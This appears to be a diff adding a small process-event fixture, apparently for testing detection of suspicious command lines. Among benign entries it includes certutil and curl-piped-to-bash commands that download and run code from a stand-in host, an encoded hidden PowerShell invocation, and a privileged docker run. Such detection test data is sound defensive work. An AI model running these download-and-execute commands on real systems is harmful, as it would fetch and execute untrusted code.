@@ -1,0 +1,8 @@
+{"Image": "C:\\Windows\\System32\\ipconfig.exe", "CommandLine": "ipconfig /all"}
+{"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil.exe -urlcache -split -f http://example.invalid/payload.bin C:\\Users\\Public\\p.bin"}
+{"Image": "/usr/bin/curl", "CommandLine": "curl -sS https://example.invalid/health"}
+{"Image": "/bin/bash", "CommandLine": "bash -c 'curl -s http://example.invalid/x.sh | bash'"}
+{"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": "cmd.exe"}
+{"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"}
+{"Image": "/usr/bin/docker", "CommandLine": "docker run --rm -it --privileged ubuntu bash"}
+{"Image": "/usr/bin/docker", "CommandLine": "docker ps -a"}
